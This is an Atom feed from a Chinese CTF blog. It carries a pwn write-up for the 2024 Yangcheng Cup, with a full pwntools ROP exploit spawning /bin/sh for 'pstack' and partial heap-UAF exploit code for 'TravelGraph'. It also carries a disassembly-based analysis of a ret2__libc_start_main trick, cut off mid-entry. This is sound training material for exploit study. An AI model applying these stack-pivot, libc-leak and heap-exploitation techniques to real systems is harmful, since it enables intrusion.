<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C_LBY&#39;s BLOG</title>
  
  
  <link href="https://c-lby.top/atom.xml" rel="self"/>
  
  <link href="https://c-lby.top/"/>
  <updated>2024-09-20T07:12:39.602Z</updated>
  <id>https://c-lby.top/</id>
  
  <author>
    <name>鎏柏鱼</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>『2024羊城杯初赛』 PWN WP</title>
    <link href="https://c-lby.top/2024/09/02/2024ycb-wp/"/>
    <id>https://c-lby.top/2024/09/02/2024ycb-wp/</id>
    <published>2024-09-02T03:16:32.000Z</published>
    <updated>2024-09-20T07:12:39.602Z</updated>
    
    <content type="html"><![CDATA[<h3 id="pstack"><a href="#pstack" class="headerlink" title="pstack"></a>pstack</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>非常经典的没有回显的0x10字节溢出，栈迁移。第一件事就要先考虑怎么泄露出libc地址。我们选择将栈劫持到bss段。从汇编代码可知vuln函数栈帧开辟了0x30大小，所以把rbp劫持为某个选定的bss段+0x30，这样rbp就会跳到bss+0x30。</p><p><img src="https://c-lby.top/images/2024ycb_wp/pstack_rbp%E8%BF%81%E7%A7%BB%E5%88%B0bss%E6%AE%B5.png" alt="pstack_rbp迁移到bss段"></p><p>因为read函数是通过<code>lea    rax, [rbp - 0x30]</code>寻址的，所以下一次read的时候payload会被写到0x601818。我们直接在这个地址上写泄露libc地址的ropchain，然后在rbp的地址处写上0x601810的话，rbp就会被劫持到那，这样经过一次leave ret之后就会从0x601850开始执行了。在这里写上leave ret，就能将rsp劫持到0x601818开始执行ropchain。这里需要注意一点是，一定要多执行一个mov rbp，rsp恢复一下两个的位置关系，因为这会rbp是0，不恢复的话后面的read没法寻址。</p><p><img src="https://c-lby.top/images/2024ycb_wp/pstack_rbp%E8%BF%81%E7%A7%BB%E5%88%B0bss%E6%AE%B52.png" alt="pstack_rbp迁移到bss段2"></p><p>泄露出来libc之后后面写system的ropchain就和前面的思路一样了。也是执行两次read两次leave ret后执行ropchain。</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = e.bss()+<span class="number">0x808</span></span><br><span class="line">leave_ret = <span class="number">0x4006DB</span></span><br><span class="line">vuln = <span class="number">0x4006b0</span></span><br><span class="line">vuln_sub_30 = <span class="number">0x4006B4</span></span><br><span class="line">rdi = <span class="number">0x400773</span></span><br><span class="line">ret = <span class="number">0x4006DC</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(bss+<span class="number">0x30</span>)+p64(vuln_sub_30)</span><br><span class="line">payload1 = p64(rdi)+p64(e.got[<span class="string">&#x27;puts&#x27;</span>])+p64(e.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(vuln)+p64(bss-<span class="number">0x8</span>)*<span class="number">3</span>+p64(leave_ret)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(payload1)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;Can you grasp this little bit of overflow?\n&quot;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Can you grasp this little bit of overflow?\n&quot;</span>)</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">payload2 = p64(ret)+p64(rdi)+p64(binsh)+p64(system)+p64(bss-<span class="number">0x8</span>)*<span class="number">3</span>+p64(leave_ret)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h3 id="TravelGraph"><a href="#TravelGraph" class="headerlink" title="TravelGraph"></a>TravelGraph</h3><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p><a href="https://blog.csdn.net/qq_44431690/article/details/108175827">Dijkstra算法学习</a></p><p>开了沙盒</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">seccomp-tools dump ./pwn</span></span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>那就走正常的orw。因为是2.35堆题，所以经典的apple2+setcontext+orw的组合。第一次调板子，好好分析一下这题。</p><p>审计代码发现delete的时候只清空了堆内对于城市名字记录的内容，没有清空route数组中地址的储存，所以有UAF漏洞。</p><h5 id="模板函数"><a href="#模板函数" class="headerlink" title="模板函数"></a>模板函数</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;&#x27;,)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">i</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;. Calculate the distance.&quot;</span>, <span class="built_in">str</span>(i).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">vehicle, start, destination, far, note</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    r.sendlineafter(</span><br><span class="line">        <span class="string">b&quot;What kind of transportation do you want? car/train/plane?&quot;</span>, vehicle)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;How far?&quot;</span>, <span class="built_in">str</span>(far).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Note:&quot;</span>, note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">start, destination</span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">start, destination</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">start, destination, idx, far, note</span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;From where?&quot;</span>, start)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;To where?&quot;</span>, destination)</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;Which one do you want to change?&quot;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    r.sendlineafter(<span class="string">b&quot;How far?&quot;</span>, <span class="built_in">str</span>(far).encode())</span><br><span class="line">    r.sendafter(<span class="string">b&quot;Note:&quot;</span>, note)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dj</span>(<span class="params">name</span>):</span><br><span class="line">    cmd(<span class="number">5</span>)</span><br><span class="line">    r.sendline(name)</span><br></pre></td></tr></table></figure><p>这道题因为开了沙盒，所以程序在初始化的时候就已经申请并且释放了很多堆到tcachebin甚至fastbin中，所以布局的时候需要注意。但是这道题里申请的堆至少是0x520大小的，所以一般情况下其实也不会涉及到tcachebin。</p><h5 id="泄露堆地址"><a href="#泄露堆地址" class="headerlink" title="泄露堆地址"></a>泄露堆地址</h5><p>这个show函数打印的内容是chunk+8和chunk+0x10两个地方，但是如果free之后，虽然有uaf，但是清空了堆里的城市名字之后，会识别不到相应的chunk，所以必须只能申请了释放掉再申请才能打印，这样一来，chunk+8的位置又被覆盖了。但是如果chunk进入了largebin，就会在chunk+0x10和0x18的地方留下堆地址，这里不会被覆盖。所以只要将chunk+0x10填满8字节就能把0x18处的堆地址带出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">free(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="string">b&#x27;nanchang&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">100</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">show(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Note:deadbeef&quot;</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heapbase = heap_addr-<span class="number">0x1470</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hex(addr)&quot;</span>, <span class="built_in">hex</span>(heapbase))</span><br></pre></td></tr></table></figure><h5 id="关于edit功能"><a href="#关于edit功能" class="headerlink" title="关于edit功能"></a>关于edit功能</h5><p>edit这里有两个限制，一个是只能edit一次，第二是需要手动赋予edit的机会。第二个限制需要通过Dijkstra算法计算满足总路程超过2000才能有edit机会。所以我们在add的时候还要考虑路径要连得上，并且距离给大一点（不能超过1000）。</p><p>所以在刚刚泄露堆地址的时候就把这个考虑进去，修改一下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">free(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;train&#x27;</span>, <span class="string">b&#x27;changsha&#x27;</span>, <span class="string">b&#x27;nanchang&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x530</span></span><br><span class="line">add(<span class="string">b&#x27;car&#x27;</span>, <span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>, <span class="number">900</span>, <span class="string">b&#x27;deadbeef&#x27;</span>)  <span class="comment"># 0x520</span></span><br><span class="line">show(<span class="string">b&#x27;guangzhou&#x27;</span>, <span class="string">b&#x27;nanning&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;Note:deadbeef&quot;</span>)</span><br><span class="line">heap_addr = u64(r.recv(<span class="number">6</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heapbase = heap_addr-<span class="number">0x1470</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hex(addr)&quot;</span>, <span class="built_in">hex</span>(heapbase))</span><br><span class="line"></span><br><span class="line">dj(<span class="string">b&quot;nanchang&quot;</span>)</span><br></pre></td></tr></table></figure><h5 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h5><p>泄露完堆地址之后的堆布局长这样（不考虑沙盒开的那堆tcachebin chunk）</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Allocated</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4a470</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x520</span> (with flag bits: <span class="number">0x521</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">Allocated</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4a990</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x530</span> (with flag bits: <span class="number">0x531</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">Allocated</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4aec0</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x530</span> (with flag bits: <span class="number">0x531</span>)</span><br><span class="line"></span><br><span class="line"><span class="type">Top</span> chunk | <span class="type">PREV_INUSE</span></span><br><span class="line"><span class="type">Addr</span>: <span class="number">0x55ab97f4b3f0</span></span><br><span class="line"><span class="type">Size</span>: <span class="number">0x1ec10</span> (with flag bits: <span class="number">0x1ec11</span>)</span><br></pre></td></tr></table></figure><p>由于show的时候需要查城市名字，所以能想到的泄露libc的方法只有从unsortedbin chunk切割了</p><p>TO BE CONTINUED…</p>]]></content>
    
    
    <summary type="html">卷</summary>
    
    
    
    <category term="WP" scheme="https://c-lby.top/categories/WP/"/>
    
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="WP" scheme="https://c-lby.top/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>记一次简单的ret2libc_start_main分析及利用</title>
    <link href="https://c-lby.top/2024/09/01/ret2libc-start-main/"/>
    <id>https://c-lby.top/2024/09/01/ret2libc-start-main/</id>
    <published>2024-09-01T04:29:00.000Z</published>
    <updated>2024-09-05T15:26:54.701Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><ol><li><p>PIE的概念</p></li><li><p><a href="https://wiki.mrskye.cn/Pwn/stackoverflow/fini_array%E5%8A%AB%E6%8C%81/fini_array%E5%8A%AB%E6%8C%81/#_1">有关__libc_start_main的文章</a></p></li></ol><p>不过其实就算没看懂这篇文章问题也不大，只要是题目做多了的话都能知道一点就是，正常gcc编译出来的elf程序都会经历一个<code>_start</code>和<code>__libc_start_main</code>的过程。</p><p>这个阶段在程序里体现为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000010A0                 public _start</span><br><span class="line">.text:00000000000010A0 _start          proc near               ; DATA XREF: LOAD:0000000000000018↑o</span><br><span class="line">.text:00000000000010A0 ; __unwind &#123;</span><br><span class="line">.text:00000000000010A0                 endbr64</span><br><span class="line">.text:00000000000010A4                 xor     ebp, ebp</span><br><span class="line">.text:00000000000010A6                 mov     r9, rdx         ; rtld_fini</span><br><span class="line">.text:00000000000010A9                 pop     rsi             ; argc</span><br><span class="line">.text:00000000000010AA                 mov     rdx, rsp        ; ubp_av</span><br><span class="line">.text:00000000000010AD                 and     rsp, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:00000000000010B1                 push    rax</span><br><span class="line">.text:00000000000010B2                 push    rsp             ; stack_end</span><br><span class="line">.text:00000000000010B3                 xor     r8d, r8d        ; fini</span><br><span class="line">.text:00000000000010B6                 xor     ecx, ecx        ; init</span><br><span class="line">.text:00000000000010B8                 lea     rdi, main       ; main</span><br><span class="line">.text:00000000000010BF                 call    cs:__libc_start_main_ptr</span><br><span class="line">.text:00000000000010C5                 hlt</span><br><span class="line">.text:00000000000010C5 ; &#125; // starts at 10A0</span><br><span class="line">.text:00000000000010C5 _start          endp</span><br></pre></td></tr></table></figure><p>这段部分如果翻源码可以发现其实是直接用汇编写的。我们只需要关注一个点，<strong>执行__libc_start_main的时候rdi寄存器里存的是main的地址</strong>。</p><p>紧接着我们来看看<code>__libc_start_main</code>，但是这个程序很长，我们只关注部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000029E33 loc_29E33:                              ; CODE XREF: __libc_start_main+124↓j</span><br><span class="line">.text:0000000000029E33                 mov     rdx, r12</span><br><span class="line">.text:0000000000029E36                 mov     esi, ebp</span><br><span class="line">.text:0000000000029E38                 mov     rdi, r13</span><br><span class="line">.text:0000000000029E3B                 call    sub_29D10</span><br></pre></td></tr></table></figure><p>call了一个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000029D10 ; void __fastcall __noreturn sub_29D10(unsigned int (__fastcall *)(_QWORD, __int64, char **), unsigned int, __int64)</span><br><span class="line">.text:0000000000029D10 sub_29D10       proc near               ; CODE XREF: __libc_start_main+7B↓p</span><br><span class="line">.text:0000000000029D10</span><br><span class="line">.text:0000000000029D10 var_90          = qword ptr -90h</span><br><span class="line">.text:0000000000029D10 var_84          = dword ptr -84h</span><br><span class="line">.text:0000000000029D10 var_80          = qword ptr -80h</span><br><span class="line">.text:0000000000029D10 var_78          = byte ptr -78h</span><br><span class="line">.text:0000000000029D10 var_30          = qword ptr -30h</span><br><span class="line">.text:0000000000029D10 var_28          = qword ptr -28h</span><br><span class="line">.text:0000000000029D10 var_10          = qword ptr -10h</span><br><span class="line">.text:0000000000029D10</span><br><span class="line">.text:0000000000029D10 ; __unwind &#123;</span><br><span class="line">.text:0000000000029D10                 push    rax</span><br><span class="line">.text:0000000000029D11                 pop     rax</span><br><span class="line">.text:0000000000029D12                 sub     rsp, 98h</span><br><span class="line">.text:0000000000029D19                 mov     [rsp+98h+var_90], rdi  &lt;-- 1</span><br><span class="line">.text:0000000000029D1E                 lea     rdi, [rsp+98h+var_78] ; env</span><br><span class="line">.text:0000000000029D23                 mov     [rsp+98h+var_84], esi</span><br><span class="line">.text:0000000000029D27                 mov     [rsp+98h+var_80], rdx</span><br><span class="line">.text:0000000000029D2C                 mov     rax, fs:28h</span><br><span class="line">.text:0000000000029D35                 mov     [rsp+98h+var_10], rax</span><br><span class="line">.text:0000000000029D3D                 xor     eax, eax</span><br><span class="line">.text:0000000000029D3F                 call    _setjmp</span><br><span class="line">.text:0000000000029D44                 endbr64</span><br><span class="line">.text:0000000000029D48                 test    eax, eax</span><br><span class="line">.text:0000000000029D4A                 jnz     short loc_29D97</span><br><span class="line">.text:0000000000029D4C                 mov     rax, fs:300h</span><br><span class="line">.text:0000000000029D55                 mov     [rsp+98h+var_30], rax</span><br><span class="line">.text:0000000000029D5A                 mov     rax, fs:2F8h</span><br><span class="line">.text:0000000000029D63                 mov     [rsp+98h+var_28], rax</span><br><span class="line">.text:0000000000029D68                 lea     rax, [rsp+98h+var_78]</span><br><span class="line">.text:0000000000029D6D                 mov     fs:300h, rax</span><br><span class="line">.text:0000000000029D76                 mov     rax, cs:environ_ptr</span><br><span class="line">.text:0000000000029D7D                 mov     edi, [rsp+98h+var_84]</span><br><span class="line">.text:0000000000029D81                 mov     rsi, [rsp+98h+var_80]</span><br><span class="line">.text:0000000000029D86                 mov     rdx, [rax]</span><br><span class="line">.text:0000000000029D89                 mov     rax, [rsp+98h+var_90]  &lt;-- 2</span><br><span class="line">.text:0000000000029D8E                 call    rax  &lt;-- 3</span><br><span class="line">.text:0000000000029D90                 mov     edi, eax</span><br><span class="line">.text:0000000000029D92</span><br><span class="line">.text:0000000000029D92 loc_29D92:                              ; CODE XREF: sub_29D10+AA↓j</span><br><span class="line">.text:0000000000029D92                 call    exit</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>其实这个函数就是pwndbg里显示的<code>__libc_start_call_main</code>。关注标注出来的几行可以发现rdi最后是被传入rax后被call了，才正式进入了main函数开始执行程序流程。换个角度来看，main函数的返回地址就是<code>mov edi,eax</code>那一行，紧接着就exit了。</p><h3 id="BaseCTF-week3-PIE题目分析"><a href="#BaseCTF-week3-PIE题目分析" class="headerlink" title="BaseCTF week3  PIE题目分析"></a>BaseCTF week3  PIE题目分析</h3><p>题目其实非常简单，也很简短。开了PIE保护。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;you said %s&quot;</span>, buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一个溢出，一次打印。问题在于这题既没有后门，也没有说把溢出放在一个子函数里，而是放在了main函数，那就导致了其返回地址是一个libc地址，没法直接部分写返回main。因为只有一次机会，没法做到同时泄露地址又写进去一个地址，所以也只有可能用部分写了。所以考虑用<code>ret2__libc_start_main</code>来重启main函数。</p><p>一开始调试看到返回地址是<code>__libc_start_call_main+128</code>（0x29D90），所以就想着我要不直接把那个地址减去108，然后填回去（0x29D10），刚好只有最后一个字节改变了。但是发现打不通，最后会卡在movaps。然后尝试绕过第一个push指令，还是不行，rax是非法地址。</p><p>然后尝试填<code>__libc_start_main</code>的首地址（0x29DC0），依然是上面两个问题。所以我就打开libc文件来看汇编了，发现<code>__libc_start_call_main</code>这个函数前半部分基本上都是在进行寄存器状态的保存。后面尝试了几次发现最后一个字节从1e到89都是可以用来打通的。所以开始找原因，于是就有了上面前置知识那样的分析。</p><p>其实最大的问题也就发生在那个rdi身上，如果他存着main的函数地址，那么main是可以被正常启动的。但是很显然程序不会无缘无故把main函数存到rdi里。所以如果跳过保存rdi到栈上那一步就能够正常运行了。</p><p>能正常运行意味着，栈上对应位置确实存着main的函数地址，这是怎么回事呢？我们动调看看。</p><p><img 